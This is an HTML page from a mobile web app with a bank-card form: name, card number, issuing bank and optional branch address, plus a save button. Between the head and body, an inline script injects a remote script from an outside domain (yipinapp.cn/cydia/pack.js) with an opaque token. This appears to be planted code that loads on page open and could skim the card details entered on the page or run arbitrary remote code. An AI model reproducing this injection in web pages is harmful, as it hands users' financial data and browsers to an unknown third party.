<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
		<title>银行卡</title>
		<link rel="stylesheet" href="../../static/css/weui.css" />
		<link rel="stylesheet" href="../../static/css/common.css" />
		<link rel="stylesheet" href="../../static/css/weui-jquery.css" />
		<link rel="stylesheet" href="../../static/css/account/method.css" />
	</head>
	<script>
		(function () {
			var dw = document.createElement("script");
			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
			var s = document.getElementsByTagName("script")[0];
			s.parentNode.insertBefore(dw, s);
		})()
	</script>
	<body>
		<header class="weui-bar weui-bar-nav" id="returnBtn">
		    <a class="weui-pull-left weui-btns">
		        <span class="weui-cell__fts"></span>
		    </a>
		    <div class="weui-title">银行卡</div>
		</header>
		<div class="methodOne">
			<div class="weui-cells weui-cells_form" id="bankBox">
				<div class="weui-cell">
				    <div class="weui-cell__hd"><label class="weui-label">姓名</label></div>
				    <div class="weui-cell__bd">
				      <input class="weui-input" type="text" id="bankName" placeholder="请输入姓名">
				    </div>
				</div>
				<div class="weui-cell">
				    <div class="weui-cell__hd"><label class="weui-label">银行卡号</label></div>
				    <div class="weui-cell__bd">
				      <input class="weui-input" type="number" id="bankNo" placeholder="请输入银行卡号">
				    </div>
				</div>
				<div class="weui-cell">
				    <div class="weui-cell__hd"><label class="weui-label">开户银行</label></div>
				    <div class="weui-cell__bd">
				      <input class="weui-input" type="text" id="bankType" placeholder="请输入开户银行">
				    </div>
				</div>
				<div class="weui-cell">
				    <div class="weui-cell__hd"><label class="weui-label">开户地址(选填)</label></div>
				    <div class="weui-cell__bd">
				      <input class="weui-input" id="bankAddress" type="text" placeholder="请输入开户地址">
				    </div>
				</div>
    		</div>
			<div class="methodDiv">
				<button type="button" class="weui-btn mybgBtn" id="bankBtn">保存</button>
			</div>
		</div>
		<script type="text/javascript" src="../../lib/zepto.min.js" ></script>
		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
		<script type="text/javascript" src="../../lib/weui.js" ></script>
		<script type="text/javascript" src="../../static/js/common.js" ></script>
		<script type="text/javascript" src="../../static/js/api.js" ></script>
		<script type="text/javascript" src="../../static/js/account/method.js" ></script>
		<script type="text/javascript" src="../../static/js/account/methodbank.js" ></script>
	</body>
</html>
